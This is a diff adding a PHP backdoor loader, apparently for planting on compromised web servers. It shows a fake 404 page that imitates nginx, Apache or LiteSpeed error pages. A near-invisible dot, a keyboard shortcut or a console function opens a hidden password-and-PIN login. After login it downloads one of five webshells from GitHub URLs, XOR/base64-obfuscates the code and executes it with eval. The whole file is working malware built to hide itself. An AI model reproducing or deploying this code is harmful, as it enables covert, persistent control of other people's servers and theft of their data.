@@ -1,0 +1,651 @@
+<?php
+ini_set('display_errors', 0);
+ini_set('display_startup_errors', 0);
+error_reporting(0);
+
+session_start();
+define('SECURE_ACCESS', true);
+header('X-Powered-By: none');
+header('Content-Type: text/html; charset=UTF-8');
+
+$hashed_password = '$2y$10$07RI6zA3ZZp0nXwUOQYXs.F7qOWQZH7gdWYWJhM5UV1pBJ8ZoKvGm';
+$hashed_pin      = '$2y$10$DPnG28Txku.005S60GJfyuqfFWrYwkvr4mYm55Od5px1xFz9o9a0y';
+
+// ambil konten dari URL
+function geturlsinfo($url) {
+    if (function_exists('curl_exec')) {
+        $conn = curl_init($url);
+        curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
+        curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
+        curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);
+        $data = curl_exec($conn);
+        curl_close($conn);
+        return $data;
+    } elseif (function_exists('file_get_contents')) {
+        return file_get_contents($url);
+    }
+    return false;
+}
+
+// obfuscation custom (XOR + base64 + loader)
+function obfuscate_code_custom($code) {
+    $key = 7;
+    $out = '';
+    $len = strlen($code);
+    for ($i = 0; $i < $len; $i++) {
+        $out .= chr(ord($code[$i]) ^ $key);
+    }
+    $b64 = base64_encode($out);
+
+    $loader = <<<'PHP'
+<?php
+$__k = 7;
+$__s = '%s';
+$__d = base64_decode($__s);
+$__o = '';
+for ($__i = 0, $__l = strlen($__d); $__i < $__l; $__i++) {
+    $__o .= chr(ord($__d[$__i]) ^ $__k);
+}
+unset($__d, $__i, $__l, $__k, $__s);
+eval("?>".$__o);
+PHP;
+
+    return sprintf($loader, $b64);
+}
+
+function is_logged_in() {
+    return isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true;
+}
+
+/* ========================
+   BAGIAN SETELAH LOGIN
+   ======================== */
+
+if (is_logged_in()) {
+
+    // daftar script S-AM yang bisa dipilih
+    $scripts = [
+        'S-AM' => 'https://raw.githubusercontent.com/sk26889/Webshell/refs/heads/main/file_manager.txt',
+        'S-AM2' => 'https://raw.githubusercontent.com/sk26889/Webshell/refs/heads/main/anti-badai.txt',
+        'S-AM3' => 'https://raw.githubusercontent.com/sk26889/Webshell/refs/heads/main/alfaori.txt',
+        'S-AM4' => 'https://raw.githubusercontent.com/sk26889/Webshell/refs/heads/main/alfa1.txt',
+        'S-AM5' => 'https://raw.githubusercontent.com/sk26889/Webshell/refs/heads/main/bdkr1.txt',
+    ];
+
+    // kalau user klik salah satu S-AM
+    if (isset($_GET['run']) && isset($scripts[$_GET['run']])) {
+        $url  = $scripts[$_GET['run']];
+        $code = geturlsinfo($url);
+        if ($code === false) {
+            die("Gagal mengambil script dari $url");
+        }
+
+        // obfuscate otomatis
+        $obf = obfuscate_code_custom($code);
+
+        // jalankan hasil obfuscate
+        eval('?>' . $obf);
+        exit;
+    }
+
+    // kalau belum pilih, tampilkan menu panel pilihan S-AM
+    ?>
+    <!DOCTYPE html>
+    <html lang="id">
+    <head>
+      <script src="https://cdn.tailwindcss.com"></script>
+        <meta charset="UTF-8">
+        <title>CONTROL PANEL</title>
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+<style>
+* {box-sizing:border-box;margin:0;padding:0;font-family:system-ui,-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif}
+html,body{height:100%}
+body{min-height:100vh;display:flex;align-items:center;justify-content:center;background:linear-gradient(rgba(0,0,0,.55),rgba(0,0,0,.9)),url("https://i.pinimg.com/736x/9f/67/82/9f678217ae40624b63cd98dffe6ddd9d.jpg");background-position:center;background-repeat:no-repeat;background-size:cover;background-attachment:fixed;color:#e5e7eb}
+.panel-card{width:380px;padding:28px 26px 24px;border-radius:20px;background:rgba(15,23,42,.88);border:1px solid rgba(129,140,248,.35);backdrop-filter:blur(18px);box-shadow:0 24px 60px rgba(0,0,0,.75);position:relative;overflow:hidden}
+.panel-card::before{content:"";position:absolute;inset:-1px;border-radius:inherit;background:radial-gradient(circle at top left,rgba(129,140,248,.55),transparent 60%),radial-gradient(circle at bottom right,rgba(236,72,153,.45),transparent 55%);mix-blend-mode:screen;opacity:.7;pointer-events:none}
+.panel-header{position:relative;margin-bottom:24px}
+.panel-badge{display:inline-flex;align-items:center;gap:6px;padding:3px 9px;border-radius:999px;font-size:10px;text-transform:uppercase;letter-spacing:.16em;border:1px solid rgba(129,140,248,.7);color:#c7d2fe;background:rgba(15,23,42,.9);margin-bottom:8px}
+.panel-badge span{width:6px;height:6px;border-radius:999px;background:#22c55e;box-shadow:0 0 10px rgba(34,197,94,.9)}
+.panel-title{font-size:20px;font-weight:600}
+.panel-sub{font-size:12px;color:#9ca3af;margin-top:2px}
+.carousel-container{position:relative;height:320px;perspective:1000px;margin-top:18px}
+.carousel-track{display:flex;height:100%;transition:transform .5s cubic-bezier(.25,1,.5,1);transform-style:preserve-3d}
+.carousel-card{flex:0 0 280px;height:280px;margin:0 8px;background:rgba(15,23,42,.9);border-radius:20px;border:1px solid;backdrop-filter:blur(20px);box-shadow:0 25px 50px rgba(0,0,0,.6);cursor:pointer;position:relative;overflow:hidden;transition:all .3s ease;text-decoration:none;color:inherit;display:flex;flex-direction:column;padding:20px;align-items:center;justify-content:center}
+.carousel-card:hover{transform:rotateY(5deg) rotateX(3deg) scale(1.02);box-shadow:0 35px 70px rgba(0,0,0,.8)}
+.carousel-card.S-AM{
+  border-color:rgba(34,197,94,.6);
+  background:linear-gradient(135deg,rgba(34,197,94,.15),rgba(15,23,42,.95)),url("https://images2.imgbox.com/c0/d9/zgrQ0nma_o.png");
+  background-size:cover;background-position:center;background-repeat:no-repeat;background-blend-mode:overlay
+}
+.carousel-card.S-AM2{
+  border-color:rgba(129,140,248,.7);
+  background:linear-gradient(135deg,rgba(129,140,248,.15),rgba(15,23,42,.95)),url("https://images2.imgbox.com/6d/40/Axea84LQ_o.png");
+  background-size:cover;background-position:center;background-repeat:no-repeat;background-blend-mode:overlay
+}
+.carousel-card.S-AM3{
+  border-color:rgba(249,115,22,.7);
+  background:linear-gradient(135deg,rgba(249,115,22,.18),rgba(6, 11, 22, 0.95)),url("https://images2.imgbox.com/a9/49/39PZFjL0_o.png");
+  background-size:cover;background-position:center;background-repeat:no-repeat;background-blend-mode:overlay
+}
+.carousel-card.S-AM4{
+  border-color:rgba(236,72,153,.7);
+  background:linear-gradient(135deg,rgba(236,72,153,.18),rgba(15,23,42,.95)),url("https://images2.imgbox.com/d3/20/8PzDUgpH_o.png");
+  background-size:cover;background-position:center;background-repeat:no-repeat;background-blend-mode:overlay
+}
+.carousel-card.S-AM5{
+  border-color:rgba(14,165,233,.8);
+  background:linear-gradient(135deg,rgba(14,165,233,.15),rgba(15,23,42,.95)),url("https://images2.imgbox.com/6e/2c/nN5r0VET_o.png");
+  background-size:cover;background-position:center;background-repeat:no-repeat;background-blend-mode:overlay
+}
+.card-glow{position:absolute;inset:0;border-radius:inherit;background:radial-gradient(circle at top left,rgba(129,140,248,.3),transparent 60%);opacity:0;transition:opacity .3s}
+.carousel-card:hover .card-glow{opacity:1}
+.card-content{height:100%;display:flex;flex-direction:column;justify-content:center;color:#e5e7eb;text-align:center}
+.card-tag{font-size:11px;text-transform:uppercase;letter-spacing:.1em;color:#9ca3af;margin-bottom:4px}
+.card-title{font-size:16px;font-weight:600;margin:8px 0;line-height:1.2}
+.card-desc{font-size:12px;color:#9ca3af}
+.nav-dots{display:flex;justify-content:center;gap:8px;margin-top:16px}
+.dot{width:10px;height:10px;border-radius:50%;background:rgba(129,140,248,.4);cursor:pointer;transition:all .3s}
+.dot.active{background:#818cf8;transform:scale(1.2);box-shadow:0 0 10px rgba(129,140,248,.8)}
+.footer-row{margin-top:18px;display:flex;justify-content:space-between;align-items:center;font-size:11px;color:#6b7280}
+.logout-link{color:#f97373;text-decoration:none}
+.logout-link:hover{text-decoration:underline}
+@media(max-width:480px){.panel-card{width:90%;padding:24px 20px}.carousel-card{flex:0 0 240px;height:240px;margin:0 6px;padding:16px}}
+.nav-btn{position:absolute;top:50%;transform:translateY(-50%);width:45px;height:45px;border-radius:50%;border:2px solid rgba(129,140,248,.6);background:rgba(15,23,42,.8);color:#e5e7eb;font-size:20px;font-weight:bold;cursor:pointer;backdrop-filter:blur(25px);box-shadow:0 10px 30px rgba(0,0,0,.6);transition:all .25s;z-index:20;display:flex;align-items:center;justify-content:center}
+.nav-btn:hover{background:rgba(129,140,248,.2);border-color:rgba(129,140,248,.9);box-shadow:0 15px 40px rgba(129,140,248,.4);transform:translateY(-50%) scale(1.15)}
+.nav-btn.left{left:-25px}
+.nav-btn.right{right:-25px}
+.nav-btn:active{transform:translateY(-50%) scale(.95)}
+@media(max-width:480px){.nav-btn{width:40px;height:40px;font-size:18px;left:-15px;right:-15px}}
+
+</style>
+
+    </head>
+    <body>
+        <div class="panel-card">
+            <div class="panel-header">
+                <div class="panel-badge">
+                    <span></span>
+                    S-AM
+                </div>
+                <div class="panel-title">PANJAHAT PERGI MENCARI UANG</div>
+                <div class="panel-sub">PAHLAWAN DATANG MENAWARKAN WAKTU LUANG :')</div>
+            </div>
+
+            <div class="carousel-container">
+  <!-- TOMBOL PANAH LUAR -->
+  <button class="nav-btn left" onclick="goToSlide((currentSlide-1+5)%5)">‹</button>
+  <button class="nav-btn right" onclick="goToSlide((currentSlide+1)%5)">›</button>
+
+  <!-- 5 CARD S-AM -->
+  <div class="carousel-track" id="carouselTrack">
+    <a href="?run=S-AM" class="carousel-card S-AM">
+      <div class="card-glow"></div>
+      <div class="card-content">
+        <div>
+          <div class="card-tag">S-AM TOOLS</div>
+          <div class="card-title">FILE MANAGER</div>
+          <div class="card-desc">Premium Tools</div>
+        </div>
+      </div>
+    </a>
+    <a href="?run=S-AM2" class="carousel-card S-AM2">
+      <div class="card-glow"></div>
+      <div class="card-content">
+        <div>
+          <div class="card-tag">S-AM TOOLS</div>
+          <div class="card-title">ANTI BADAI</div>
+          <div class="card-desc">Premium Tools</div>
+        </div>
+      </div>
+    </a>
+    <a href="?run=S-AM3" class="carousel-card S-AM3">
+      <div class="card-glow"></div>
+      <div class="card-content">
+        <div>
+          <div class="card-tag">S-AM TOOLS</div>
+          <div class="card-title">ALFA ORI</div>
+          <div class="card-desc">Premium Tools</div>
+        </div>
+      </div>
+    </a>
+    <a href="?run=S-AM4" class="carousel-card S-AM4">
+      <div class="card-glow"></div>
+      <div class="card-content">
+        <div>
+          <div class="card-tag">S-AM TOOLS</div>
+          <div class="card-title">ALFA MANAGER</div>
+          <div class="card-desc">Premium Tools</div>
+        </div>
+      </div>
+    </a>
+    <a href="?run=S-AM5" class="carousel-card S-AM5">
+      <div class="card-glow"></div>
+      <div class="card-content">
+        <div>
+          <div class="card-tag">S-AM TOOLS</div>
+          <div class="card-title">PARAMETER WP</div>
+          <div class="card-desc">Premium Tools</div>
+        </div>
+      </div>
+    </a>
+  </div>
+</div>
+        <script>const track=document.getElementById('carouselTrack'),dots=document.querySelectorAll('.dot');let currentSlide=0;const totalSlides=5;const cardWidth=296;function goToSlide(slide){currentSlide=slide;track.style.transform=`translateX(${-slide*cardWidth}px)`;dots.forEach((dot,i)=>dot.classList.toggle('active',i===slide))}dots.forEach((dot,index)=>dot.addEventListener('click',()=>goToSlide(index)));setInterval(()=>{currentSlide=(currentSlide+1)%totalSlides;goToSlide(currentSlide)},4000);document.querySelectorAll('.carousel-card').forEach(card=>{card.addEventListener('mousemove',e=>{const rect=card.getBoundingClientRect(),x=e.clientX-rect.left,y=e.clientY-rect.top,cx=rect.width/2,cy=rect.height/2,rx=(y-cy)/20,ry=(cx-x)/20;card.style.transform=`rotateX(${rx}deg) rotateY(${ry}deg) scale(1.02)`});card.addEventListener('mouseleave',()=>card.style.transform='rotateX(0deg) rotateY(0deg) scale(1)')});
+</script>
+
+
+    </body>
+    </html>
+    <?php
+    exit;
+}
+
+/* ========================
+   PROSES LOGIN - FAKE 404 + TITIK TRANSPARAN
+   ======================== */
+
+if (isset($_GET['logout'])) {
+    $_SESSION = [];
+    session_destroy();
+    header("Location: " . $_SERVER['PHP_SELF']);
+    exit;
+}
+
+// Login handler via POST
+if (isset($_POST['_pass']) && isset($_POST['_pin'])) {
+    if (password_verify($_POST['_pass'], $hashed_password) && password_verify($_POST['_pin'], $hashed_pin)) {
+        session_regenerate_id(true);
+        $_SESSION['logged_in'] = true;
+        header("Location: " . $_SERVER['PHP_SELF'] . "?t=" . time());
+        exit;
+    }
+}
+
+// =====================================================
+// FAKE 404 - DETEKSI SERVER SECARA OTOMATIS
+// =====================================================
+
+http_response_code(404);
+
+// Deteksi jenis server dari $_SERVER['SERVER_SOFTWARE']
+$server_software = $_SERVER['SERVER_SOFTWARE'] ?? '';
+$request_uri = htmlspecialchars($_SERVER['REQUEST_URI'] ?? '/');
+$server_name = htmlspecialchars($_SERVER['SERVER_NAME'] ?? 'localhost');
+
+// Pilih template berdasarkan server
+if (stripos($server_software, 'nginx') !== false) {
+    // TEMPLATE NGINX
+    $template = 'nginx';
+    $server_version = 'nginx/1.18.0';
+    if (stripos($server_software, '1.20') !== false) $server_version = 'nginx/1.20.2';
+    if (stripos($server_software, '1.22') !== false) $server_version = 'nginx/1.22.1';
+    if (stripos($server_software, '1.24') !== false) $server_version = 'nginx/1.24.0';
+} elseif (stripos($server_software, 'apache') !== false) {
+    // TEMPLATE APACHE
+    $template = 'apache';
+    $server_version = 'Apache/2.4.41';
+    if (stripos($server_software, '2.2') !== false) $server_version = 'Apache/2.2.22';
+    if (stripos($server_software, '2.4') !== false) $server_version = 'Apache/2.4.54';
+} elseif (stripos($server_software, 'litespeed') !== false) {
+    // TEMPLATE LITESPEED
+    $template = 'litespeed';
+    $server_version = 'LiteSpeed Server';
+} elseif (stripos($server_software, 'cloudflare') !== false) {
+    // TEMPLATE CLOUDFLARE
+    $template = 'cloudflare';
+    $server_version = 'cloudflare';
+} else {
+    // TEMPLATE GENERIC
+    $template = 'generic';
+    $server_version = 'Server';
+}
+?>
+<!DOCTYPE html>
+<html>
+<head>
+<title>404 Not Found</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<style>
+    /* Gaya dasar untuk semua template */
+    * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+    }
+    
+    /* Hanya untuk memposisikan titik login */
+    .login-dot {
+        position: fixed;
+        top: 5px;
+        right: 5px;
+        width: 6px;
+        height: 6px;
+        background: rgba(0,0,0,0.06);
+        border-radius: 50%;
+        cursor: pointer;
+        z-index: 10000;
+        transition: all 0.2s ease;
+    }
+    .login-dot:hover {
+        background: rgba(0,0,0,0.15);
+        width: 8px;
+        height: 8px;
+        top: 4px;
+        right: 4px;
+    }
+    
+    /* Modal Login */
+    .login-modal {
+        display: none;
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: rgba(0,0,0,0.5);
+        z-index: 10001;
+        justify-content: center;
+        align-items: center;
+    }
+    .login-modal.active {
+        display: flex;
+    }
+    .login-box {
+        background: white;
+        padding: 25px;
+        border-radius: 8px;
+        width: 300px;
+        box-shadow: 0 10px 25px rgba(0,0,0,0.2);
+    }
+    .login-box h3 {
+        margin-bottom: 15px;
+        text-align: center;
+        font-family: Arial, sans-serif;
+        color: #333;
+    }
+    .login-box input {
+        width: 100%;
+        padding: 10px;
+        margin-bottom: 12px;
+        border: 1px solid #ccc;
+        border-radius: 4px;
+        font-family: monospace;
+    }
+    .login-box button {
+        width: 100%;
+        padding: 10px;
+        background: #333;
+        color: white;
+        border: none;
+        border-radius: 4px;
+        cursor: pointer;
+    }
+    .login-box button:hover {
+        background: #555;
+    }
+    .close-modal {
+        float: right;
+        font-size: 20px;
+        cursor: pointer;
+        color: #999;
+    }
+    .login-error {
+        color: #c00;
+        font-size: 11px;
+        text-align: center;
+        margin-top: 10px;
+        display: none;
+    }
+    
+    /* ========== TEMPLATE NGINX ========== */
+    .nginx-body {
+        font-family: 'Courier New', monospace;
+        background: #f5f5f5;
+        padding: 40px 20px;
+    }
+    .nginx-container {
+        max-width: 700px;
+        margin: 0 auto;
+        background: white;
+        padding: 35px;
+        border-left: 5px solid #e74c3c;
+        box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+    }
+    .nginx-container h1 {
+        font-size: 26px;
+        font-weight: normal;
+        margin-bottom: 15px;
+        color: #c0392b;
+    }
+    .nginx-container p {
+        margin: 12px 0;
+        line-height: 1.5;
+        font-size: 14px;
+    }
+    .nginx-container code {
+        background: #f0f0f0;
+        padding: 2px 5px;
+        font-family: monospace;
+    }
+    .nginx-container hr {
+        border: none;
+        border-top: 1px solid #e0e0e0;
+        margin: 20px 0;
+    }
+    .nginx-footer {
+        font-size: 11px;
+        color: #999;
+    }
+    
+    /* ========== TEMPLATE APACHE ========== */
+    .apache-body {
+        font-family: 'Times New Roman', serif;
+        background: #fff;
+        margin: 0;
+        padding: 0;
+    }
+    .apache-container {
+        margin: 100px auto;
+        width: 600px;
+        border: 1px solid #ccc;
+        padding: 20px;
+        background: #f8f8f8;
+    }
+    .apache-container h1 {
+        font-size: 22px;
+        color: #900;
+        margin-bottom: 10px;
+    }
+    .apache-container address {
+        margin-top: 15px;
+        font-size: 11px;
+    }
+    
+    /* ========== TEMPLATE LITESPEED ========== */
+    .litespeed-body {
+        font-family: Arial, sans-serif;
+        background: #e0e0e0;
+        padding: 50px;
+    }
+    .litespeed-container {
+        max-width: 600px;
+        margin: 0 auto;
+        background: #fff;
+        padding: 30px;
+        border-radius: 5px;
+        box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+    }
+    .litespeed-container h1 {
+        color: #0066cc;
+        font-size: 24px;
+    }
+    
+    /* ========== TEMPLATE GENERIC ========== */
+    .generic-body {
+        font-family: Arial, Helvetica, sans-serif;
+        background: #f1f1f1;
+        padding: 40px;
+    }
+    .generic-container {
+        max-width: 650px;
+        margin: 0 auto;
+        background: #fff;
+        padding: 40px;
+        text-align: center;
+        border-radius: 8px;
+        box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+    }
+    .generic-container h1 {
+        font-size: 72px;
+        color: #555;
+    }
+</style>
+</head>
+<body class="<?php echo $template; ?>-body" style="margin:0;padding:0;">
+
+<!-- TITIK LOGIN TRANSPARAN -->
+<div class="login-dot" id="loginDot"></div>
+
+<!-- MODAL LOGIN -->
+<div class="login-modal" id="loginModal">
+    <div class="login-box">
+        <span class="close-modal" id="closeModal">&times;</span>
+        <h3>Authentication Required</h3>
+        <form id="loginForm">
+            <input type="password" id="loginPass" placeholder="Password" autocomplete="off">
+            <input type="password" id="loginPin" placeholder="PIN" autocomplete="off" maxlength="6">
+            <button type="submit">Submit</button>
+            <div class="login-error" id="loginError"></div>
+        </form>
+    </div>
+</div>
+
+<?php if ($template == 'nginx'): ?>
+<!-- FAKE 404 NGINX -->
+<div class="nginx-container">
+    <h1>404 Not Found</h1>
+    <p>The requested URL <code><?php echo $request_uri; ?></code> was not found on this server.</p>
+    <hr>
+    <div class="nginx-footer">
+        <i><?php echo $server_version; ?> (Ubuntu) Server at <?php echo $server_name; ?> Port 80</i>
+    </div>
+</div>
+
+<?php elseif ($template == 'apache'): ?>
+<!-- FAKE 404 APACHE -->
+<div class="apache-container">
+    <h1>Not Found</h1>
+    <p>The requested URL <strong><?php echo $request_uri; ?></strong> was not found on this server.</p>
+    <hr>
+    <address><?php echo $server_version; ?> (Ubuntu) Server at <?php echo $server_name; ?> Port 80</address>
+</div>
+
+<?php elseif ($template == 'litespeed'): ?>
+<!-- FAKE 404 LITESPEED -->
+<div class="litespeed-container">
+    <h1>404 Not Found</h1>
+    <p>The resource requested could not be found on this server.</p>
+    <hr>
+    <small><?php echo $server_version; ?> at <?php echo $server_name; ?> Port 80</small>
+</div>
+
+<?php else: ?>
+<!-- FAKE 404 GENERIC -->
+<div class="generic-container">
+    <h1>404</h1>
+    <p><strong>Page not found</strong></p>
+    <p>The page you are looking for might have been removed or is temporarily unavailable.</p>
+</div>
+<?php endif; ?>
+
+<script>
+    // Elemen
+    var dot = document.getElementById('loginDot');
+    var modal = document.getElementById('loginModal');
+    var closeModal = document.getElementById('closeModal');
+    var loginForm = document.getElementById('loginForm');
+    var loginPass = document.getElementById('loginPass');
+    var loginPin = document.getElementById('loginPin');
+    var loginError = document.getElementById('loginError');
+    
+    // Buka modal
+    dot.addEventListener('click', function(e) {
+        e.stopPropagation();
+        modal.classList.add('active');
+        loginPass.focus();
+    });
+    
+    // Tutup modal
+    closeModal.addEventListener('click', function() {
+        modal.classList.remove('active');
+        loginError.style.display = 'none';
+        loginPass.value = '';
+        loginPin.value = '';
+    });
+    
+    // Klik di luar modal
+    modal.addEventListener('click', function(e) {
+        if (e.target === modal) {
+            modal.classList.remove('active');
+            loginError.style.display = 'none';
+            loginPass.value = '';
+            loginPin.value = '';
+        }
+    });
+    
+    // Submit form
+    loginForm.addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        var formData = new FormData();
+        formData.append('_pass', loginPass.value);
+        formData.append('_pin', loginPin.value);
+        
+        fetch(window.location.href, {
+            method: 'POST',
+            body: formData,
+            credentials: 'same-origin'
+        })
+        .then(function(response) {
+            if (response.redirected) {
+                window.location.href = response.url;
+            } else {
+                loginError.style.display = 'block';
+                loginError.textContent = 'Invalid credentials';
+                loginPass.value = '';
+                loginPin.value = '';
+                loginPass.focus();
+            }
+        })
+        .catch(function() {
+            loginError.style.display = 'block';
+            loginError.textContent = 'Error occurred';
+        });
+    });
+    
+    // Shortcut Ctrl+Shift+L
+    document.addEventListener('keydown', function(e) {
+        if (e.ctrlKey && e.shiftKey && e.key === 'L') {
+            e.preventDefault();
+            modal.classList.add('active');
+            loginPass.focus();
+        }
+    });
+    
+    // Console login method
+    window.__login = function(pass, pin) {
+        var fd = new FormData();
+        fd.append('_pass', pass);
+        fd.append('_pin', pin);
+        fetch(window.location.href, {method:'POST', body:fd, credentials:'same-origin'})
+        .then(function(r){ if(r.redirected) location.href=r.url; });
+    };
+    
+    // Silent console
+    console.log("%c.", "color:transparent");
+</script>
+</body>
+</html>
+<?php exit; ?>
